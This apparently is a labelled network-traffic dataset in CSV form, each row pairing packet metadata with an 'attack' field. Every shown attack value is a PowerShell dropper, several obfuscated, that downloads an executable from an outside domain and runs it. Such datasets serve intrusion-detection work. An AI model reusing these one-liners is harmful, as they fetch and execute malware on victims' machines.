field,src,dst,p_src,p_dst,proto,attack,length [packet],length [bit]
TIMING,203.139.118.176,58.48.198.40,80,30190,6,"$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETFoLDerpATh('Desktop');(&'New-Object' 'System.Net.WebClient').dOwNLoaDFile.iNvoKE('http://mokerton.com/onion','$Des\6300365.exe');&'Start-Process' $Des\6300365.exe
",1825,1825
TIMING,203.139.121.234,109.196.225.86,30303,52816,6,"$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETfoLDERpATh('Desktop');(&'New-Object' 'System.Net.WebClient').dowNLoaDFilE.iNVoKE('http://sunyst.co/dfm','$Des\538050.exe');&'Start-Process' $Des\538050.exe
",1769,1769
TIMING,203.139.121.234,109.58.252.70,36694,30303,6," sleep 1;(.'new-object' 'system.net.webclient').('downloadfile').Invoke('http://kescloc.co/phb','%temp%.exe');&'start-process' '%temp%.exe'
",1121,1121
TIMING,203.139.121.234,130.85.161.127,50356,30303,6,"$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gEtfoLdeRpATh('Desktop');(&'New-Object' 'System.Net.WebClient').dowNLoADFilE.iNVoKE('http://mokerton.com/syope','$Des\6933895.exe');&'Start-Process' $Des\6933895.exe
",1825,1825
TIMING,203.139.121.234,13.5.165.135,59386,30303,6,"$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETfoLDeRpaTh('Desktop');(&'New-Object' 'System.Net.WebClient').dowNLoaDFilE.iNVoKE('https://librez.ga/nlop','$Des\6331659.exe');&'Start-Process' $Des\6331659.exe
",1801,1801
TIMING,18.26.229.200,203.139.121.234,30303,34958,6,"(new-object system.net.webclient).downloadfile('http://homerbongasi.com/dotnorm.exe','xxxiv.exe');start-process 'xxxiv.exe'
",993,993
TIMING,203.139.121.234,135.177.98.249,30303,50322,6,"$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETfoLDeRpaTh('Desktop');(&'New-Object' 'System.Net.WebClient').dowNLoaDFilE.iNVoKE('https://librez.ga/nlop','$Des\1336024.exe');&'Start-Process' $Des\1336024.exe
",1801,1801
TIMING,203.139.121.234,116.58.147.90,30303,44410,6,"($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://www.amspeconline.com/123/nana.exe', $dpl);Start-Process $dpl
",1129,1129
TIMING,203.139.121.234,135.177.15.99,49024,30303,6," sleep 1;(.'new-object' 'system.net.webclient').('downloadfile').Invoke('https://temporally.ml/btray','%temp%.exe');&'start-process' '%temp%.exe'
",1169,1169
TIMING,203.139.121.234,47.3.179.31,38762,26915,6,"function DHkDuBsOuyeSQcAuyO ( $NPaRfdcsLmGgTfIKNeDsAos , $TIBNgmtxYOtyMtlbH ){(New-Object System.Net.WebClient).DownloadFile( $NPaRfdcsLmGgTfIKNeDsAos , $TIBNgmtxYOtyMtlbH );(New-Object -com Shell.Application).ShellExecute( $TIBNgmtxYOtyMtlbH ); }
",1985,1985
TIMING,163.62.23.51,223.0.148.122,63830,6003,6,"(new-object system.net.webclient).downloadfile('http://ditetec.com/ts.exe','kpivhk.exe');start-process 'kpivhk.exe'
",929,929
